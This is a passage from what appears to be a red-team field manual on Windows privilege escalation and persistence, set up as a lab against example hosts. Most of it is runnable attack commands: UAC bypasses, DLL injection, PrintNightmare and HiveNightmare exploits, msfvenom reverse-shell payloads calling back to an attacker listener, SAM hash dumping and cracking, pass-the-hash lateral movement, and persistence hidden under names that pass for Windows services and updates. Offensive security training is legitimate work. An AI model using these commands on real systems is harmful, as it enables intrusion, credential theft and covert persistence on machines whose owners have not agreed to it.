Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
  -Name "(default)" -Value "cmd.exe" -Force
Start-Process "C:\Windows\System32\computerdefaults.exe"
# Expected: cmd.exe at HIGH integrity!

# ── BYPASS 3: eventvwr.exe (older Windows 10 versions) ────────────
New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\Shell\Open\command" `
  -Name "(default)" -Value "cmd.exe" -Force
Start-Process "C:\Windows\System32\eventvwr.exe"

# ── BYPASS 4: sdclt.exe (Windows 10) ─────────────────────────────
New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Force
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" `
  -Name "(default)" -Value "C:\Windows\Temp\shell.exe" -Force
Start-Process "C:\Windows\System32\sdclt.exe"

# ── BYPASS 5: Metasploit auto-UAC-bypass ─────────────────────────
# meterpreter> use exploit/windows/local/bypassuac_fodhelper
# meterpreter> use exploit/windows/local/bypassuac_computerdefaults
# meterpreter> use exploit/windows/local/bypassuac_eventvwr
# set SESSION current_session_id
# run
# Expected: new HIGH integrity meterpreter session!

# ── BYPASS 6: UACME (ULTIMATE UAC BYPASS TOOL) ────────────────────
# https://github.com/hfiref0x/UACME
# Comprehensive collection of 60+ UAC bypass methods
# Usage: akagi64.exe METHOD payload.exe
# Methods change with Windows updates — check UACME for current working ones
.\akagi64.exe 23 C:\Windows\Temp\shell.exe    # Method 23 (check UACME docs for your target)
.\akagi64.exe 61 C:\Windows\Temp\shell.exe    # Method 61

# VERIFY BYPASS SUCCESS:
whoami /groups | findstr "High"
# Expected: Mandatory Label\High Mandatory Level   ← SUCCESS!
```

---

# PART 9 — ADVANCED TECHNIQUES

---

## 34. DLL Injection & Hijacking (General)

```powershell
# ── DLL INJECTION INTO RUNNING PROCESS ───────────────────────────
# Requires: SeDebugPrivilege (or owned process)
# Injects DLL into a target process → code executes in that process's context

# Find a SYSTEM process to inject into:
$systemProc = Get-Process -IncludeUserName | 
  Where-Object {$_.UserName -match "SYSTEM"} | 
  Select-Object -First 1
$targetPID = $systemProc.Id

# Inject DLL using PowerSploit:
Import-Module .\Invoke-DllInjection.ps1
Invoke-DllInjection -ProcessID $targetPID -Dll C:\Windows\Temp\payload.dll
# DLL executes in SYSTEM process context = SYSTEM privileges!

# Meterpreter injection:
# meterpreter> migrate $targetPID   ← migrates your session into SYSTEM process

# ── DLL SEARCH ORDER HIJACKING (SERVICE CONTEXT) ──────────────────
# Covered in Section 11 — plant DLL in PATH that service loads

# ── PHANTOM DLL HIJACKING ─────────────────────────────────────────
# Some Windows system components try to load DLLs that don't exist
# These "phantom" DLLs can be planted in writable PATH locations
# Known phantom DLLs (no longer present on modern Windows):
# - C:\Windows\System32\WptsExtensions.dll
# - C:\Windows\System32\TSMSISrv.dll

# Plant phantom DLL:
copy payload.dll "C:\Windows\System32\WptsExtensions.dll"
# Loaded by Windows components automatically
```

---

## 37. PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

### Layman's Terms
PrintNightmare is a **Remote Code Execution and Local Privilege Escalation vulnerability in the Windows Print Spooler service**. The Print Spooler runs as SYSTEM. By convincing it to load a driver from a path we control, our malicious DLL gets executed as SYSTEM. Works on virtually all Windows versions unless patched.

```powershell
# CHECK: Is Print Spooler running?
Get-Service -Name Spooler
# Expected: Running → potentially vulnerable (patch-dependent)

# ── LOCAL PRIVILEGE ESCALATION (LPE) ─────────────────────────────
# Works on unpatched Windows 10 / Server 2016/2019/2022
# Requires: low-priv local user

# Method 1: Using SharpPrintNightmare:
# Download: https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare
.\SharpPrintNightmare.exe C:\Windows\Temp\payload.dll
# payload.dll is your reverse shell or adduser DLL
# Expected: payload runs as SYSTEM!

# Method 2: Using Invoke-Nightmare.ps1:
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Password123!" -DriverName "PrintMe"
# Expected: hacker added as local admin!

net localgroup administrators
# hacker is now administrator

# Method 3: Metasploit:
use exploit/windows/local/cve_2021_1675_printnightmare
set SESSION meterpreter_session
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
# Expected: New SYSTEM meterpreter session!

# GENERATE DLL PAYLOAD:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.50 LPORT=4444 -f dll -o payload.dll
# nc -lvnp 4444 before running exploit
```

---

## 38. HiveNightmare / SeriousSAM (CVE-2021-36934)

### Layman's Terms
In Windows 10/11 (specific versions), **Volume Shadow Copies of the SAM, SYSTEM, and SECURITY hives are readable by any local user**. This means ANY local user can extract ALL local password hashes. No admin needed, no LSASS access needed — just read a file.

```powershell
# CHECK: Are you running a vulnerable Windows version?
# Affected: Windows 10 1809+ (some builds), Windows 11 initial release

# Vulnerability check: can we read VSS copies of SAM?
$vssPath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM"
try { Get-Item $vssPath -ErrorAction Stop; Write-Host "VULNERABLE!" -ForegroundColor Red }
catch { Write-Host "Not vulnerable or no shadow copy" }

# Find shadow copies:
vssadmin list shadows
# Expected:
# Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
#   For volume: (C:)\\?\Volume{...}\

# Copy SAM from shadow (no admin needed if vulnerable):
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" C:\Temp\SAM
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\Temp\SYSTEM
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" C:\Temp\SECURITY

# Transfer to Kali, extract hashes:
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
# Expected — ALL local hashes without any admin privileges!
# Administrator:500:aad3b...:8846f7eaee8fb117ad06bdd830b7586c:::

# Crack:
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

# PART 10 — PERSISTENCE ON WINDOWS

---

## 39. Windows Persistence Mechanisms

```powershell
# ══════════════════════════════════════════════════════════════════
# PERSISTENCE MECHANISMS (stealthy to obvious)
# ══════════════════════════════════════════════════════════════════

# ── 1. REGISTRY AUTORUN (user-level — runs on user login) ─────────
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
# Runs as logged-in user on each login
# More stealthy with legitimate-sounding name

# System-level (requires admin/SYSTEM):
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
# Runs as the user who logs in

# ── 2. SCHEDULED TASK (most reliable — survives reboots) ──────────
# Run at startup as SYSTEM:
schtasks /create /tn "Microsoft\Windows\WindowsUpdate\Automatic App Update" /tr "C:\Windows\Temp\shell.exe" /sc onstart /ru SYSTEM /f
# Hides in Microsoft\Windows namespace — blends with legitimate tasks

# Run every 5 minutes:
schtasks /create /tn "SystemHealthMonitor" /tr "C:\Windows\Temp\shell.exe" /sc minute /mo 5 /ru SYSTEM /f

# Using PowerShell (more control):
$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\shell.exe"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden    # Hidden from GUI!
Register-ScheduledTask -TaskName "WindowsDefenderUpdate" -Action $action -Trigger $trigger -RunLevel Highest -Settings $settings -User "SYSTEM" -Force

# ── 3. WINDOWS SERVICE (runs as SYSTEM, auto-start) ───────────────
sc create SystemHealthSvc binpath= "C:\Windows\Temp\shell.exe" start= auto obj= "LocalSystem"
sc start SystemHealthSvc
# Runs as SYSTEM, auto-starts on boot
# Most suspicious — services are monitored by security tools

# ── 4. STARTUP FOLDER ─────────────────────────────────────────────
# User-level (runs for current user):
copy C:\Windows\Temp\shell.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
# System-level (runs for ALL users — requires admin):
copy C:\Windows\Temp\shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# ── 5. DLL SIDE-LOADING (stealthy — hijacks legitimate app) ───────
# Place malicious DLL in directory of legitimate auto-starting app
# When legitimate app loads → loads your DLL → shell
# Find apps that load DLLs from writable locations (Procmon approach)

# ── 6. WMI EVENT SUBSCRIPTION (stealthy — no file, in WMI db) ────
# Triggers when specific event occurs (process creation, time, etc.)
$filterName = "WindowsSecurityFilter"
$consumerName = "WindowsSecurityConsumer"
$command = "C:\Windows\Temp\shell.exe"

# Create event filter (what to watch for):
$wmiFilter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
    Name = $filterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
}

# Create event consumer (what to do):
$wmiConsumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{
    Name = $consumerName
    CommandLineTemplate = $command
}

# Bind filter to consumer:
Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
    Filter = $wmiFilter
    Consumer = $wmiConsumer
}
# Now: every time explorer.exe is created → shell.exe runs!
# Very stealthy: no files in startup, no registry autorun, no service

# ── 7. SSH KEYS (if OpenSSH installed) ────────────────────────────
# OpenSSH is now built into Windows 10/Server 2019+
Get-Service sshd   # Check if running
# Add authorized key:
mkdir C:\Users\Administrator\.ssh -Force
"ssh-ed25519 AAAA... attacker" | Add-Content C:\Users\Administrator\.ssh\authorized_keys
# SSH in: ssh -i attacker_key Administrator@10.10.10.100
```

---

# PART 11 — FULL CHAINS

---

## 40. Full PrivEsc Lab: Low-Priv Shell → SYSTEM

```cmd
:: ══════════════════════════════════════════════════════════════════
:: COMPLETE CHAIN: Low-priv user → SYSTEM → Persistence
:: Target: Windows 10 Pro (10.10.10.100)
:: Starting credential: bob:Password1! (domain user, not local admin)
:: ══════════════════════════════════════════════════════════════════

:: LAB TOPOLOGY:
:: ┌──────────────────────────────────────────────────────────────────┐
:: │  Kali (10.10.10.50)    ←→    Target Win10 (10.10.10.100)        │
:: │                               Domain user: bob:Password1!        │
:: │                               Service: VulnerableApp (SYSTEM)    │
:: │                               AlwaysInstallElevated = 1          │
:: │                               AutoLogon: Administrator creds     │
:: └──────────────────────────────────────────────────────────────────┘

:: ── STEP 1: GET INITIAL SHELL ─────────────────────────────────────
:: Assuming you have evil-winrm access as bob:
:: evil-winrm -i 10.10.10.100 -u bob -p Password1!
```

```powershell
# ── STEP 2: FIRST 60 SECONDS ──────────────────────────────────────
whoami /all
# uid=CORP\bob groups=Domain Users
# Privileges: SeChangeNotifyPrivilege, SeImpersonatePrivilege  ← Potato path!

systeminfo | findstr "OS Version Build"
# Windows 10 Pro, Build 19041

# ── STEP 3: RUN WINPEAS ───────────────────────────────────────────
# Upload WinPEAS:
# *Evil-WinRM* PS> upload /kali/winPEASx64.exe C:\Windows\Temp\wp.exe
C:\Windows\Temp\wp.exe 2>nul | Tee-Object C:\Windows\Temp\wp_out.txt

# KEY FINDINGS FROM WINPEAS:
# [!] AlwaysInstallElevated: HKCU=1, HKLM=1   ← INSTANT SYSTEM!
# [!] AutoLogon: Administrator : SuperSecret1! ← ADMIN CREDS IN REGISTRY!
# [!] Unquoted service path: VulnerableApp     ← Backup path
# [?] SeImpersonatePrivilege                   ← Potato attack possible

# ── STEP 4: EXPLOIT AUTOLOGON CREDS (easiest path) ────────────────
# We found cleartext admin password in registry!
net use \\localhost\c$ /user:Administrator SuperSecret1!
# If this works → admin access!
# From Kali:
impacket-psexec Administrator:'SuperSecret1!'@10.10.10.100
# Expected: SYSTEM shell!

# ── STEP 5: IF AUTOLOGON FAILS — USE AlwaysInstallElevated ────────
# Generate MSI payload:
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.50 LPORT=4444 -f msi -o shell.msi
# Upload:
# *Evil-WinRM*> upload /kali/shell.msi C:\Windows\Temp\shell.msi

# Set up listener: nc -lvnp 4444
# Execute:
msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
# Expected: SYSTEM reverse shell!

# ── STEP 6: POST-EXPLOITATION AS SYSTEM ────────────────────────────
# Dump local hashes:
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
# Transfer to Kali and crack:
# impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Try password reuse on other machines:
# crackmapexec smb 10.10.10.0/24 -u Administrator -H HASH

# ── STEP 7: PERSISTENCE ────────────────────────────────────────────
# Add SSH public key for persistent access:
mkdir C:\Users\Administrator\.ssh -Force
echo "ssh-ed25519 AAAA... attacker" | Add-Content C:\Users\Administrator\.ssh\authorized_keys

# Add scheduled task:
schtasks /create /tn "Microsoft\Windows\Diagnosis\DiagnosticsRunner" /tr "C:\Windows\Temp\shell.exe" /sc onstart /ru SYSTEM /f

# ── STEP 8: LATERAL MOVEMENT ────────────────────────────────────────
# With SAM hashes — PtH to other machines on network:
# crackmapexec smb 10.10.10.0/24 -u Administrator -H HASH --local-auth
# Any machine where local Admin hash is the same → (Pwn3d!)
```

---

## 41. Windows PrivEsc Decision Tree

```
┌──────────────────────────────────────────────────────────────────────┐
│               WINDOWS PRIVESC DECISION TREE                         │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  START: Low-priv shell                                               │
│                │                                                     │
│                ▼                                                     │
│  whoami /priv ──► SeImpersonatePrivilege?                           │
│                     YES → GodPotato/PrintSpoofer → SYSTEM ✓         │
│                │ NO                                                  │
│                ▼                                                     │
│  reg query AutoLogon ──► DefaultPassword exists?                    │
│                            YES → runas/psexec with creds → admin ✓  │
│                │ NO                                                  │
│                ▼                                                     │
│  reg query AlwaysInstallElevated ──► Both = 1?                       │
│                                        YES → MSI payload → SYSTEM ✓ │
│                │ NO                                                  │
│                ▼                                                     │
│  whoami /priv ──► SeDebugPrivilege?                                 │
│                     YES → Dump LSASS → creds → admin ✓              │
│                │ NO                                                  │
│                ▼                                                     │
│  Get-ModifiableService ──► Modifiable service?                       │
│                               YES → Replace binary → SYSTEM ✓       │
│                │ NO                                                  │
│                ▼                                                     │
│  wmic service ... ──► Unquoted service path?                         │
│                          YES → Plant binary in gap → SYSTEM ✓        │
│                │ NO                                                  │
│                ▼                                                     │
│  schtasks /query ──► Writable task binary?                          │
│                          YES → Replace binary → SYSTEM ✓             │
│                │ NO                                                  │
│                ▼                                                     │
│  Check Unattend.xml ──► Deployment password exists?                  │
│                            YES → Use creds → admin ✓                │
│                │ NO                                                  │
│                ▼                                                     │
│  checkIntegrity/UAC ──► Local admin but medium integrity?            │
│                            YES → UAC bypass → High integrity ✓       │
│                │ NO                                                  │
│                ▼                                                     │
│  systeminfo ──► Missing patches? ──► HiveNightmare/PrintNightmare    │
│                │                         → SYSTEM ✓                  │
│                ▼                                                     │
│  Run WinPEAS ──► Investigate RED findings → iterate above           │
└──────────────────────────────────────────────────────────────────────┘
```

---

*Next module: **Network Pivoting & Tunneling** — SSH tunnels, SOCKS proxies, Chisel, Ligolo-ng, double pivots, traffic through restricted firewalls, full multi-hop attack chains.*

*Cross-references:*
- *Token impersonation in AD context: `Active_Directory_RedTeam_Field_Manual.md` Sections 18, 30*
- *SMB/WinRM access from Kali: `Ports_Protocols_RedTeam_Field_Manual.md` Sections 14, 18*
- *LSASS dump methods overview: `Active_Directory_RedTeam_Field_Manual.md` Section 22*
- *Linux equivalent of this module: `Linux_PrivEsc_PostExploitation_RedTeam_Field_Manual.md`*

*Tools: WinPEAS, PowerUp, SharpUp, Seatbelt, Watson, Mimikatz, GodPotato,*
*PrintSpoofer, SweetPotato, JuicyPotato, SharpDPAPI, SharpChrome, accesschk,*
*ProcDump, nanodump, UACME, SharpPrintNightmare, lsassy, evil-winrm*

*Labs: HackTheBox Windows easy/medium machines, PG Practice (Windows),*
*TryHackMe Windows PrivEsc path, OSCP Windows machines, VulnHub: Brainpan,*
*CRTO course labs (Windows-heavy), PortSwigger for Windows-side web vulns*